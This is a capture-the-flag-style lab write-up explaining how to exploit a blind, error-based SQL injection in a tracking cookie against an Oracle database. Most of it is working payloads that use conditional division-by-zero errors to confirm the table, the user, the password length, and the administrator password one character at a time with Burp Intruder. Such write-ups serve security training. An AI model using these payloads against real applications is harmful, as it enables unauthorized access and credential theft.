## Description

this lab contains a blind SQL injection vulnerability, the application uses a tracking cookie for analytics and performs a SQL query containing the value of the cookie

the results of the query are not returned and the application does not respon differently based on whether or not the query returns any rows, but if the query causes any errors then the application returns a custom error message 

the database contains a table called 'users' with columns 'password' and 'username', exploit the SQL injection vulnerability to find out the password of the 'administrator' user

## Solution

first check for the injection with a simple quote [ ' ] injection

	Cookie: TrackingId=[cookie]' \\ the application returns an error 

then it is possible to bruteforce the 'administrator' password with Burp Intruder:

	' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administrator'),$1$,1) = '$2' THEN TO_CHAR(1/0) ELSE TO_CHAR(1/1) END FROM dual) ='1

Parameters:
- 1st payload: Numbers, From 1 to 20, Step1
- 2nd payload: Brute forcer, Character set: lowercase alphanumeric, Min/Max length: 1

then analyzing the response length will reveal the 20 characters password

## Notes:

while it was possible to complete the lab with the given solution it assumed a lot of things such as a 20 character password (because it probably would be the same as the other labs), also the DBMS used was gotten through the 'hint' of the lab

this is the more appropriate solution:

test a simple quote injection \\\\ this will cause an error

test two simple quotes \\\\ this will not cause an error, suggesting a syntax error is having a detectable effect on the response

confirm that the server is interpreting the injection as a SQL query (confirm the error is a SQL syntax error as opposed to any other kind of error), this can be achieved by constructing a subquery using valid SQL syntax

	' || (SELECT '') ||' \\ this will cause an error 

this does not mean however that the server is not interpreting the injection as SQL, it might happen due to the database type 

	' || (SELECT '' FROM dual) ||' \\ this will not cause an error

from this it is possible to know that the database used is Oracle (because it required a explicit specified table name) which will help in crafting the proper injection later

testing for an invalid table name with valid syntax:

	' || (SELECT '' FROM sacanagem) ||' \\ this will cause an error

this behavior strongly suggests that the injection is being processed as a SQL query by the backend 

now it is possible to extract information using conditional statements that will throw an error alongside valid SQL syntax

verifying the existence of the 'users' table:

	' ||(SELECT '' FROM users WHERE ROWNUM=1)||' \\ does not return an error, indicating the existence of the table; note that the WHERE ROWNUM=1 statement is necessary so that the query response does not break the concatenation

testing conditional statements:

	' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' \\ this will not cause an error

	' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' \\ this will cause an error

now we test for the existence of the 'administrator' user in the 'users' table:

	 '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' \\ this will cause an error

	 '|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' \\ this will not cause an error

next step is determining the length of the administrator user password:

	' || (SELECT CASE WHEN LENGTH(password) > 19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' \\ this will cause an error, indicating the password is longer than 19 characters

	' || (SELECT CASE WHEN LENGTH(password) > 20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' \\ this will not cause an error, indicating the password is exactly 20 characters long

after determining the length it should be easy to use Burp Intruder to test for the password (in this case, assuming alphanumeric lowercase) 

	' || (SELECT CASE WHEN SUBSTR(password,$1$,1) = $2$ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

using the first payload as a numeric list from 1 to 20 with step 1 and the second as an alphanumeric lowercase list the password will be retrieved by analyzing which requests triggered an error

